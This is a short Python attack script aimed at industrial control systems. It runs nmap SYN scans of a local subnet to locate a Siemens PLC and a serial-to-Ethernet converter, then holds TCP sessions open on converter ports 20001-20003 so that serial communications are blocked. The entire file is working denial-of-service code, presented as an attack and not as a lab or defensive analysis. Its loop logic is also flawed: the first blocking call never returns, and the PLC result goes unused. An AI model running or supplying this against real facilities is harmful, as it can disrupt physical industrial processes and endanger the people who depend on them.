import subprocess
import socket
import time
import re

# Step 1: Find PLC's IP Address
def find_siemens_plc():
    try:
        print("[*] Scanning Network for Siemens PLC...")
        result = subprocess.check_output(["nmap", "-p", "102", "--open", "-sS", "10.0.0.0/24"], encoding="utf-8")
        matches = re.findall(r"(\d+\.\d+\.\d+\.\d+)", result)
        if matches:
            plc_ip = matches[0]
            print(f"[+] Siemens PLC Found: {plc_ip}")
            return plc_ip
    except Exception as e:
        print(f"[-] Error scanning for PLC: {e}")
        return None

# Step 2: Find Serial-to-Ethernet Converter
def find_serial_converter():
    try:
        print("[*] Scanning for Serial-to-Ethernet Converter...")
        result = subprocess.check_output(["nmap", "-p", "20000-21000", "--open", "-sS", "10.0.0.0/24"], encoding="utf-8")
        matches = re.findall(r"(\d+\.\d+\.\d+\.\d+)", result)
        if matches:
            converter_ip = matches[0]
            print(f"[+] Serial-to-Ethernet Converter Found: {converter_ip}")
            return converter_ip
    except Exception as e:
        print(f"[-] Error scanning for Serial Converter: {e}")
        return None

# Step 3: Block Serial COM by Holding TCP Open
def block_serial_com(ip, port):
    try:
        print(f"[*] Attempting to Block Serial COM on {ip}:{port}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        print(f"[+] Holding TCP Connection to {ip}:{port} Open...")
        while True:
            time.sleep(5)  # Keep the session open
    except Exception as e:
        print(f"[-] Failed to block Serial COM: {e}")

# Execution
if __name__ == "__main__":
    plc_ip = find_siemens_plc()
    converter_ip = find_serial_converter()

    if converter_ip:
        for port in [20001, 20002, 20003]:  # Common Serial COM ports
            block_serial_com(converter_ip, port)